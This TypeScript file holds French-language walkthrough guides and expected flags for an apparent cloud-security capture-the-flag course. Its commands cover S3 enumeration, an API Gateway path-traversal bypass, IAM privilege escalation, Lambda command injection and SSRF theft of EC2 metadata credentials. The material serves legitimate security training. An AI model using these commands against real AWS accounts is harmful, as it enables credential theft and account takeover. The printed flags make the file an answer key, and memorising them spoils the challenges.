import { ChallengeGuide } from '../guides';

export const guides: Record<string, ChallengeGuide> = {
  // 1.1.1
  '1.1.1': {
    context: "La première étape lors d'un test d'intrusion cloud consiste à cartographier la surface d'attaque externe. Les buckets S3 mal configurés sont une des vulnérabilités les plus courantes.",
    objective: "Identifier et lister le contenu d'un bucket S3 public exposé sans aucune authentification.",
    concepts: ["Amazon S3", "AWS CLI", "Reconnaissance", "Accès Anonyme"],
    steps: [
      {
        title: "Énumération de buckets S3",
        detail: "Utilisez la commande AWS CLI pour lister le contenu du bucket cible en mode anonyme (sans fournir d'identifiants).",
        command: "aws s3 ls s3://<bucket_name> --no-sign-request"
      },
      {
        title: "Récupération du flag",
        detail: "Identifiez le fichier de flag dans le bucket et téléchargez-le pour lire son contenu. Le flag attendu est **PCE{s3_public_bucket_recon_2024}**.",
        command: "aws s3 cp s3://<bucket_name>/flag.txt . --no-sign-request && cat flag.txt"
      }
    ]
  },
  // 1.1.2
  '1.1.2': {
    context: "Certains services AWS peuvent fuiter des informations sur l'infrastructure même sans authentification si des permissions excessives sont appliquées au groupe 'All Users'.",
    objective: "Utiliser l'AWS CLI sans configuration pour énumérer des ressources cloud exposées.",
    concepts: ["AWS CLI", "Unauthenticated Access", "Reconnaissance Cloud"],
    steps: [
      {
        title: "Configuration de l'environnement",
        detail: "Assurez-vous qu'aucune clé d'accès AWS n'est configurée dans votre environnement pour simuler un attaquant externe non authentifié.",
        command: "unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN"
      },
      {
        title: "Énumération des ressources",
        detail: "Lancez une requête d'énumération non authentifiée vers les ressources cibles (par exemple un bucket ou une API publique). Le flag attendu est **PCE{unauth_s3_buck3t_enum_2026}**.",
        command: "aws s3api get-bucket-acl --bucket <target_bucket> --no-sign-request"
      }
    ]
  },
  // 1.1.3
  '1.1.3': {
    context: "API Gateway est souvent utilisé pour exposer des services internes. Si l'authentification (IAM, Cognito, ou Custom Authorizer) est mal configurée, des endpoints peuvent être accessibles publiquement.",
    objective: "Découvrir et interagir avec un endpoint API Gateway non protégé.",
    concepts: ["API Gateway", "REST API", "Missing Authentication"],
    steps: [
      {
        title: "Reconnaissance de l'API",
        detail: "Utilisez `curl` pour interroger l'URL de l'API Gateway découverte. Cherchez des endpoints documentés ou communs comme `/api/v1/users` ou `/status`.",
        command: "curl -s https://<api_id>.execute-api.<region>.amazonaws.com/prod/status"
      },
      {
        title: "Exploitation de l'endpoint vulnérable",
        detail: "Accédez à l'endpoint contenant des données sensibles ou des fonctionnalités d'administration non protégées. Le flag attendu est **PCE{api_gw_unprotected_2026}**.",
        command: "curl -s https://<api_id>.execute-api.<region>.amazonaws.com/prod/admin/flag"
      }
    ]
  },
  // 1.1.4
  '1.1.4': {
    context: "Avant d'interagir avec les cibles, les attaquants utilisent des sources d'informations publiques pour découvrir des ressources cloud associées à une entreprise.",
    objective: "Utiliser des techniques de reconnaissance passive (Certificate Transparency, OSINT) pour trouver des infrastructures cloud.",
    concepts: ["OSINT", "Certificate Transparency", "Passive Recon"],
    steps: [
      {
        title: "Recherche sur crt.sh",
        detail: "Interrogez les logs de Certificate Transparency pour trouver des sous-domaines (potentiellement des API Gateway, CloudFront ou ELB) appartenant à la cible.",
        command: "curl -s 'https://crt.sh/?q=%.<target_domain>&output=json' | jq -r '.[].name_value' | sort -u"
      },
      {
        title: "Identification et récupération du flag",
        detail: "Visitez le sous-domaine découvert qui expose publiquement des informations critiques. Le flag attendu est **PCE{passive_recon_reveals_all_2024}**.",
        command: "curl -s https://<hidden_subdomain>.<target_domain>/flag"
      }
    ]
  },
  // 1.2.1
  '1.2.1': {
    context: "Même si un bucket S3 ne permet pas de lister son contenu (`s3:ListBucket`), il est possible d'y lire des fichiers si l'on connaît ou devine leur nom exact et que la permission `s3:GetObject` est publique.",
    objective: "Exfiltrer des fichiers cachés depuis un bucket S3 public dont l'énumération est désactivée.",
    concepts: ["Amazon S3", "Data Exfiltration", "Hidden Prefix", "Brute Force"],
    steps: [
      {
        title: "Tentative d'énumération (Échec attendu)",
        detail: "Si vous essayez de lister le bucket, vous recevrez un 'Access Denied'. Vous devez deviner le nom du fichier ou du préfixe.",
        command: "aws s3 ls s3://<bucket_name> --no-sign-request"
      },
      {
        title: "Exfiltration du fichier caché",
        detail: "Utilisez un dictionnaire ou une information divulguée pour télécharger le fichier directement. Le flag attendu est **PCE{s3_exfil_hidden_prefix_2024}**.",
        command: "aws s3 cp s3://<bucket_name>/secret-prefix/flag.txt . --no-sign-request && cat flag.txt"
      }
    ]
  },
  // 1.2.2
  '1.2.2': {
    context: "Les API Gateways utilisent parfois des règles basées sur les chemins (path-based routing) qui peuvent être contournées via des techniques de normalisation (path traversal, URL encoding).",
    objective: "Contourner l'authentification d'une API Gateway en exploitant une faille de normalisation de chemin.",
    concepts: ["API Gateway", "Auth Bypass", "Path Normalization", "Web Attacks"],
    steps: [
      {
        title: "Accès refusé sur l'endpoint protégé",
        detail: "Un accès direct à `/admin` renverra un code 401 ou 403.",
        command: "curl -I https://<api_id>.execute-api.<region>.amazonaws.com/prod/admin"
      },
      {
        title: "Contournement via normalisation",
        detail: "Utilisez des séquences comme `../` ou une normalisation de chemin pour atteindre l'endpoint protégé via un endpoint public. Le flag attendu est **PCE{api_gateway_path_normalization_bypass_2024}**.",
        command: "curl -s 'https://<api_id>.execute-api.<region>.amazonaws.com/prod/public/..%2fadmin/flag'"
      }
    ]
  },
  // 1.2.3
  '1.2.3': {
    context: "Une base de données (RDS) doit toujours être déployée dans un sous-réseau privé. Lorsqu'elle est exposée publiquement et protégée par des identifiants faibles, elle devient une cible facile.",
    objective: "Se connecter à une base de données RDS exposée sur Internet.",
    concepts: ["Amazon RDS", "Public Exposure", "Database Security"],
    steps: [
      {
        title: "Résolution DNS de l'instance RDS",
        detail: "Récupérez l'endpoint de la base de données et vérifiez si son adresse IP est publique.",
        command: "dig +short <rds_endpoint>.rds.amazonaws.com"
      },
      {
        title: "Connexion à la base de données",
        detail: "Utilisez un client de base de données (ex: psql, mysql) avec les identifiants par défaut ou fuités pour vous connecter et extraire les données. Le flag attendu est **PCE{rds_pUbl1c_2024}**.",
        command: "psql -h <rds_endpoint>.rds.amazonaws.com -U postgres -c 'SELECT flag FROM secrets;'"
      }
    ]
  },
  // 1.2.4
  '1.2.4': {
    context: "Les Security Groups agissent comme des pare-feu virtuels. Autoriser le trafic entrant depuis `0.0.0.0/0` (Internet) sur des ports critiques (ex: 22, 3389, 2375) expose l'infrastructure.",
    objective: "Identifier et exploiter un service exposé à cause d'un Security Group trop permissif.",
    concepts: ["Security Groups", "Firewall Rules", "Network Exposure"],
    steps: [
      {
        title: "Scan de ports de l'instance",
        detail: "Effectuez un scan Nmap rapide sur l'adresse IP publique de la cible pour découvrir les ports ouverts (ex: un port Redis ou Docker ouvert sur Internet).",
        command: "nmap -Pn -p- -T4 <target_ip>"
      },
      {
        title: "Exploitation du service exposé",
        detail: "Connectez-vous au service mal protégé pour récupérer le flag. Le flag attendu est **PCE{cloud_sg_too_permissive_2024}**.",
        command: "redis-cli -h <target_ip> GET flag"
      }
    ]
  },
  // 1.3.1
  '1.3.1': {
    context: "La permission `iam:PassRole` permet de transmettre un rôle à un service AWS (ex: EC2, Lambda). Couplée à des droits comme `iam:CreateAccessKey` ou `ec2:RunInstances`, elle mène à une escalade de privilèges.",
    objective: "Exploiter les permissions PassRole et CreateAccessKey pour obtenir un accès administrateur.",
    concepts: ["IAM Privilege Escalation", "PassRole", "CreateAccessKey"],
    steps: [
      {
        title: "Création d'une clé d'accès pour un autre utilisateur",
        detail: "Utilisez vos permissions pour générer de nouvelles clés d'accès (Access Key) pour un utilisateur IAM ayant plus de droits ou des droits pour passer un rôle d'administration.",
        command: "aws iam create-access-key --user-name <target_admin_user>"
      },
      {
        title: "Utilisation des privilèges élevés",
        detail: "Configurez l'AWS CLI avec ces nouvelles clés et récupérez le flag depuis un service protégé (ex: Parameter Store ou S3). Le flag attendu est **PCE{passrole_createaccesskey_escalation_2024}**.",
        command: "AWS_ACCESS_KEY_ID=<new_key> AWS_SECRET_ACCESS_KEY=<new_secret> aws ssm get-parameter --name /flag --with-decryption"
      }
    ]
  },
  // 1.3.2
  '1.3.2': {
    context: "La permission `sts:AssumeRole` permet à une identité de prendre temporairement les droits d'un rôle. Si un rôle est mal configuré (Trust Policy permissive), n'importe qui peut l'assumer.",
    objective: "Pivoter vers un autre compte ou obtenir des droits supérieurs via l'abus de AssumeRole.",
    concepts: ["AssumeRole", "IAM Trust Policies", "Lateral Movement"],
    steps: [
      {
        title: "Assumer le rôle vulnérable",
        detail: "Exécutez la commande `assume-role` pour obtenir les identifiants temporaires du rôle cible.",
        command: "aws sts assume-role --role-arn arn:aws:iam::<account_id>:role/<vuln_role> --role-session-name PivotSession"
      },
      {
        title: "Récupération du flag avec la nouvelle identité",
        detail: "Utilisez les clés générées (AccessKeyId, SecretAccessKey, SessionToken) pour accéder aux ressources de ce rôle. Le flag attendu est **PCE{assume_role_pivot_2024}**.",
        command: "AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws s3 cp s3://<protected_bucket>/flag.txt - "
      }
    ]
  },
  // 1.3.3
  '1.3.3': {
    context: "Les fonctions AWS Lambda exécutent du code en réponse à des événements. Si l'entrée n'est pas assainie, elle peut mener à une exécution de commandes (RCE) dans l'environnement de la Lambda.",
    objective: "Exploiter une injection de commande dans une fonction Lambda pour exfiltrer ses variables d'environnement.",
    concepts: ["AWS Lambda", "Command Injection", "Serverless Security"],
    steps: [
      {
        title: "Test de l'injection de commande",
        detail: "Envoyez un payload via l'API Gateway ou le déclencheur de la Lambda pour exécuter une commande arbitraire comme `env`.",
        command: "curl -X POST https://<api_id>.execute-api.<region>.amazonaws.com/prod/process -d '{\"input\": \"127.0.0.1; env\"}'"
      },
      {
        title: "Lecture du flag dans l'environnement",
        detail: "Analysez la réponse de la Lambda pour récupérer les variables d'environnement contenant le flag et les credentials temporaires de la Lambda. Le flag attendu est **PCE{lambda_cmd_injection_2026}**.",
        command: "echo \"Le flag est dans les variables d'environnement renvoyées par la commande env.\""
      }
    ]
  },
  // 1.3.4
  '1.3.4': {
    context: "Avoir la permission `iam:AttachUserPolicy` ou `iam:AttachRolePolicy` sur sa propre identité permet d'attacher la politique 'AdministratorAccess' pour devenir administrateur total du compte.",
    objective: "Attacher la politique gérée 'AdministratorAccess' à votre propre utilisateur IAM.",
    concepts: ["IAM Privilege Escalation", "AttachUserPolicy", "AdministratorAccess"],
    steps: [
      {
        title: "Vérification des politiques attachées",
        detail: "Listez vos permissions actuelles pour confirmer la présence du droit d'attacher des politiques.",
        command: "aws iam list-attached-user-policies --user-name <votre_user>"
      },
      {
        title: "Escalade et récupération du flag",
        detail: "Attachez AdministratorAccess à votre compte pour prendre le contrôle total, puis lisez le flag. Le flag attendu est **PCE{iam_attach_policy_privesc_2024}**.",
        command: "aws iam attach-user-policy --user-name <votre_user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
      }
    ]
  },
  // 1.4.1
  '1.4.1': {
    context: "IMDSv1 (Instance Metadata Service) permet à une instance EC2 de requêter ses métadonnées à l'IP `169.254.169.254`. Une faille SSRF dans une application web sur l'EC2 permet à un attaquant de lire ces données.",
    objective: "Exploiter une SSRF pour atteindre l'IMDSv1 et voler les credentials IAM (rôle EC2).",
    concepts: ["SSRF", "IMDSv1", "Credentials Theft", "EC2 Metadata"],
    steps: [
      {
        title: "Découverte du nom du rôle IAM",
        detail: "Utilisez la vulnérabilité SSRF (ex: un paramètre `url=`) pour lister le nom du rôle attaché à l'instance.",
        command: "curl 'http://<target_app>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
      },
      {
        title: "Vol des identifiants (STS)",
        detail: "Récupérez les AccessKey, SecretKey et SessionToken du rôle. Le flag attendu est **PCE{imds_ssrf_stolen_role_creds_2024}**.",
        command: "curl 'http://<target_app>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>'"
      }
    ]
  },
  // 1.4.2
  '1.4.2': {
    context: "IMDSv2 ajoute une couche de sécurité en exigeant un header `X-aws-ec2-metadata-token`. Toutefois, si la vulnérabilité SSRF permet d'injecter ou de contrôler les headers HTTP (ex: requêtes PUT), IMDSv2 peut être contourné.",
    objective: "Contourner IMDSv2 via l'injection de headers dans une requête SSRF.",
    concepts: ["SSRF", "IMDSv2", "Header Injection", "Bypass"],
    steps: [
      {
        title: "Génération du token IMDSv2",
        detail: "Exploitez l'application pour envoyer une requête `PUT` vers l'endpoint de token avec le header `X-aws-ec2-metadata-token-ttl-seconds` pour récupérer le token.",
        command: "curl -X POST -d 'method=PUT&url=http://169.254.169.254/latest/api/token&headers[X-aws-ec2-metadata-token-ttl-seconds]=21600' 'http://<target_app>/proxy'"
      },
      {
        title: "Utilisation du token pour l'exfiltration",
        detail: "Réutilisez le token récupéré dans une nouvelle requête SSRF pour accéder aux credentials. Le flag attendu est **PCE{1mdsv2_byp4ss_h34d3rs_2026}**.",
        command: "curl -X POST -d 'method=GET&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>&headers[X-aws-ec2-metadata-token]=<votre_token>' 'http://<target_app>/proxy'"
      }
    ]
  },
  // 1.4.3
  '1.4.3': {
    context: "Même si l'accès à l'IMDS est bloqué ou protégé, une SSRF peut toujours être utilisée pour rebondir (pivoter) vers des services internes inaccessibles depuis Internet (ex: instances RDS, Redis, APIs internes).",
    objective: "Utiliser une SSRF pour interagir avec un service interne au VPC.",
    concepts: ["SSRF", "Internal Network Pivot", "VPC Security"],
    steps: [
      {
        title: "Scan du réseau interne via SSRF",
        detail: "Fuzz ou parcourez les adresses IP privées (ex: `10.0.0.x`) via le paramètre vulnérable pour trouver des services actifs.",
        command: "ffuf -w wordlist_ips.txt -u 'http://<target_app>/fetch?url=http://FUZZ:80/status'"
      },
      {
        title: "Accès au service interne",
        detail: "Interagissez avec l'API interne découverte (ex: un serveur d'administration local) pour récupérer le flag. Le flag attendu est **PCE{ssrf_m3t4d4t4_2026}**.",
        command: "curl 'http://<target_app>/fetch?url=http://10.0.0.54:8080/admin/flag'"
      }
    ]
  }
};
